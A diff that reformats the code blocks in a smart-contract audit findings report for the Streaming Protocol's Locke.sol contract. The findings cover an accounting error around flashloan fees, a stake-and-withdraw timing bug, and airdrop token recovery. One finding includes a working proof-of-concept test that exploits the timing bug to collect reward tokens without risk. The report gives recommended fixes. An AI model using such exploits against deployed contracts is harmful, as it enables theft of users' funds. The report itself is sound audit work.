@@ -95,7 +95,7 @@ _Submitted by WatchPug, also found by 0x0x0x, ScopeLift, gpersoon, harleythedog,
 
 <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L654-L654>
 
-```solidity=654
+```solidity
 uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);
 ```
 
@@ -125,7 +125,7 @@ Given:
 
 Change to:
 
-```solidity=654
+```solidity
 uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens) - depositTokenFlashloanFeeAmount;
 ```
 
@@ -366,82 +366,84 @@ The economic feasability of the attack depends on:
 ##### code
 
 The following was added to `Locke.t.sol` for the `StreamTest` Contract to simulate the attack from one EOA.
+```solidity
+function test_quickDepositAndWithdraw() public {
+    //// SETUP
+    // accounting (to proof attack): save the rewardBalance of alice.
+    uint StartBalanceA = testTokenA.balanceOf(address(alice));
+    uint112 stakeAmount = 10_000;
 
-        function test_quickDepositAndWithdraw() public {
-            //// SETUP
-            // accounting (to proof attack): save the rewardBalance of alice.
-            uint StartBalanceA = testTokenA.balanceOf(address(alice));
-            uint112 stakeAmount = 10_000;
+    // start stream and fill it
+    (
+        uint32 maxDepositLockDuration,
+        uint32 maxRewardLockDuration,
+        uint32 maxStreamDuration,
+        uint32 minStreamDuration
+    ) = defaultStreamFactory.streamParams();
 
-            // start stream and fill it
-            (
-                uint32 maxDepositLockDuration,
-                uint32 maxRewardLockDuration,
-                uint32 maxStreamDuration,
-                uint32 minStreamDuration
-            ) = defaultStreamFactory.streamParams();
+    uint64 nextStream = defaultStreamFactory.currStreamId();
+    Stream stream = defaultStreamFactory.createStream(
+        address(testTokenA),
+        address(testTokenB),
+        uint32(block.timestamp + 10), 
+        maxStreamDuration,
+        maxDepositLockDuration,
+        0,
+        false
+        // false,
+        // bytes32(0)
+    );
+    
+    testTokenA.approve(address(stream), type(uint256).max);
+    stream.fundStream(1_000_000_000);
 
-            uint64 nextStream = defaultStreamFactory.currStreamId();
-            Stream stream = defaultStreamFactory.createStream(
-                address(testTokenA),
-                address(testTokenB),
-                uint32(block.timestamp + 10), 
-                maxStreamDuration,
-                maxDepositLockDuration,
-                0,
-                false
-                // false,
-                // bytes32(0)
-            );
-            
-            testTokenA.approve(address(stream), type(uint256).max);
-            stream.fundStream(1_000_000_000);
+    // wait till the stream starts
+    hevm.warp(block.timestamp + 16);
+    hevm.roll(block.number + 1);
 
-            // wait till the stream starts
-            hevm.warp(block.timestamp + 16);
-            hevm.roll(block.number + 1);
-
-            // just interact with contract to fill "lastUpdate" and "ts.lastUpdate" 
-    	// without changing balances inside of Streaming contract
-            alice.doStake(stream, address(testTokenB), stakeAmount);
-            alice.doWithdraw(stream, stakeAmount);
+    // just interact with contract to fill "lastUpdate" and "ts.lastUpdate" 
+// without changing balances inside of Streaming contract
+    alice.doStake(stream, address(testTokenB), stakeAmount);
+    alice.doWithdraw(stream, stakeAmount);
 
 
-            ///// ATTACK COMES HERE
-            // stake
-            alice.doStake(stream, address(testTokenB), stakeAmount);
+    ///// ATTACK COMES HERE
+    // stake
+    alice.doStake(stream, address(testTokenB), stakeAmount);
 
-            // wait a block
-            hevm.roll(block.number + 1);
-            hevm.warp(block.timestamp + 16);
+    // wait a block
+    hevm.roll(block.number + 1);
+    hevm.warp(block.timestamp + 16);
 
-            // withdraw soon thereafter
-            alice.doWithdraw(stream, stakeAmount);
+    // withdraw soon thereafter
+    alice.doWithdraw(stream, stakeAmount);
 
-            // finish the stream
-            hevm.roll(block.number + 9999);
-            hevm.warp(block.timestamp + maxDepositLockDuration);
+    // finish the stream
+    hevm.roll(block.number + 9999);
+    hevm.warp(block.timestamp + maxDepositLockDuration);
 
-            // get reward
-            alice.doClaimReward(stream);
-     
+    // get reward
+    alice.doClaimReward(stream);
 
-            // accounting (to proof attack): save the rewardBalance of alice / save balance of stakeToken
-            uint EndBalanceA = testTokenA.balanceOf(address(alice));
-            uint EndBalanceB = testTokenB.balanceOf(address(alice));
 
-            // Stream returned everything we gave it
-            // (doStake sets balance of alice out of thin air => we compare end balance against our (thin air) balance)
-            assert(stakeAmount == EndBalanceB);
+    // accounting (to proof attack): save the rewardBalance of alice / save balance of stakeToken
+    uint EndBalanceA = testTokenA.balanceOf(address(alice));
+    uint EndBalanceB = testTokenB.balanceOf(address(alice));
 
-            // we gained reward token without risk
-            assert(StartBalanceA == 0);
-            assert(StartBalanceA < EndBalanceA);
-            emit log_named_uint("alice gained", EndBalanceA);
-        }
+    // Stream returned everything we gave it
+    // (doStake sets balance of alice out of thin air => we compare end balance against our (thin air) balance)
+    assert(stakeAmount == EndBalanceB);
+
+    // we gained reward token without risk
+    assert(StartBalanceA == 0);
+    assert(StartBalanceA < EndBalanceA);
+    emit log_named_uint("alice gained", EndBalanceA);
+}
+```
 
 ##### commandline
 
+```zsh
     dapp test --verbosity=2 --match "test_quickDepositAndWithdraw" 2> /dev/null
     Running 1 tests for src/test/Locke.t.sol:StreamTest
     [PASS] test_quickDepositAndWithdraw() (gas: 4501209)
@@ -449,7 +451,7 @@ The following was added to `Locke.t.sol` for the `StreamTest` Contract to simula
     Success: test_quickDepositAndWithdraw
 
       alice gained: 13227
-
+```
 #### Tools Used
 
 dapptools
@@ -531,18 +533,18 @@ Thus more tokens can be withdrawn than you are supposed to be able to withdraw.
 
 ```JS
 function stake(uint112 amount) public lock updateStream(msg.sender) {
-      ...         
-        uint112 trueDepositAmt = uint112(newBal - prevBal);
-       ... 
-        ts.tokens += trueDepositAmt;
+    ...         
+    uint112 trueDepositAmt = uint112(newBal - prevBal);
+    ... 
+    ts.tokens += trueDepositAmt;
 ```
 
 <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L455-L479>
 
 ```JS
 function withdraw(uint112 amount) public lock updateStream(msg.sender) {
-        ...
-        ts.tokens -= amount;
+    ...
+    ts.tokens -= amount;
 ```
 
 <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L203-L250>
@@ -550,13 +552,13 @@ function withdraw(uint112 amount) public lock updateStream(msg.sender) {
 ```JS
 function updateStreamInternal(address who) internal {
 ...
- uint32 acctTimeDelta = uint32(block.timestamp) - ts.lastUpdate;
-            if (acctTimeDelta > 0 && ts.tokens > 0) {
-                // some time has passed since this user last interacted
-                // update ts not yet streamed
-                ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));
-                ts.lastUpdate = uint32(block.timestamp);
-            }
+uint32 acctTimeDelta = uint32(block.timestamp) - ts.lastUpdate;
+    if (acctTimeDelta > 0 && ts.tokens > 0) {
+        // some time has passed since this user last interacted
+        // update ts not yet streamed
+        ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));
+        ts.lastUpdate = uint32(block.timestamp);
+    }
 ```
 
 #### Recommended Mitigation Steps
@@ -564,13 +566,13 @@ function updateStreamInternal(address who) internal {
 Change the code in updateStream()  to:
 
 ```JS
-    if (acctTimeDelta > 0 ) {
-                // some time has passed since this user last interacted
-                // update ts not yet streamed
-                if (ts.tokens > 0) 
-                      ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));
-                ts.lastUpdate = uint32(block.timestamp);  // always update ts.lastUpdate (if time has elapsed)
-            }
+if (acctTimeDelta > 0 ) {
+    // some time has passed since this user last interacted
+    // update ts not yet streamed
+    if (ts.tokens > 0) 
+            ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));
+    ts.lastUpdate = uint32(block.timestamp);  // always update ts.lastUpdate (if time has elapsed)
+}
 ```
 
 Note: the next if statement with unstreamed and lastUpdate can be changed in a similar way to save some gas
@@ -754,7 +756,7 @@ Add airdrop tokens balance mapping, record what is gathered in `arbitraryCall` a
 
 Now:
 
-```
+```solidity
 mapping (address => uint112) public incentives;
 ...
 function recoverTokens(address token, address recipient) public lock {
@@ -768,40 +770,41 @@ function recoverTokens(address token, address recipient) public lock {
 ```
 
 To be:
-
-    mapping (address => uint112) public incentives;
-    mapping (address => uint112) public airdrops;
+```solidity
+mapping (address => uint112) public incentives;
+mapping (address => uint112) public airdrops;
+...
+function recoverTokens(address token, address recipient) public lock {
+...
+    if (incentives[token] > 0) {
+        ...
+        uint256 excess = ERC20(token).balanceOf(address(this)) - incentives[token];
+        ...
+    }
+    if (airdrops[token] > 0) {
+        ...
+        uint256 excess = ERC20(token).balanceOf(address(this)) - airdrops[token];
+        ...
+    }
+...
+// we do know what airdrop token will be gathered
+function arbitraryCall(address who, bytes memory data, address token) public lock externallyGoverned {
     ...
-    function recoverTokens(address token, address recipient) public lock {
-    ...
-    		if (incentives[token] > 0) {
-    			...
-    			uint256 excess = ERC20(token).balanceOf(address(this)) - incentives[token];
-    			...
-    		}
-    		if (airdrops[token] > 0) {
-    			...
-    			uint256 excess = ERC20(token).balanceOf(address(this)) - airdrops[token];
-    			...
-    		}
-    ...
-    // we do know what airdrop token will be gathered
-    function arbitraryCall(address who, bytes memory data, address token) public lock externallyGoverned {
-    		...
 
-    		// get token balances
-    		uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));
-    		uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));
-    		uint256 preAirdropBalance = ERC20(token).balanceOf(address(this));
+    // get token balances
+    uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));
+    uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));
+    uint256 preAirdropBalance = ERC20(token).balanceOf(address(this));
 
-    		(bool success, bytes memory _ret) = who.call(data);
-    		require(success);
-    		
-    		uint256 postAirdropBalance = ERC20(token).balanceOf(address(this));
-    		require(postAirdropBalance <= type(uint112).max, "air_112");
-    		uint112 amt = uint112(postAirdropBalance - preAirdropBalance);
-    		require(amt > 0, "air");
-    		airdrops[token] += amt;
+    (bool success, bytes memory _ret) = who.call(data);
+    require(success);
+    
+    uint256 postAirdropBalance = ERC20(token).balanceOf(address(this));
+    require(postAirdropBalance <= type(uint112).max, "air_112");
+    uint112 amt = uint112(postAirdropBalance - preAirdropBalance);
+    require(amt > 0, "air");
+    airdrops[token] += amt;
+```
 
 **[brockelmore (Streaming Protocol) disputed](https://github.com/code-423n4/2021-11-streaming-findings/issues/162#issuecomment-987041410):**
  > The intention is that the claim airdrop + transfer is done atomically. Compound-style governance contracts come with this ability out of the box.
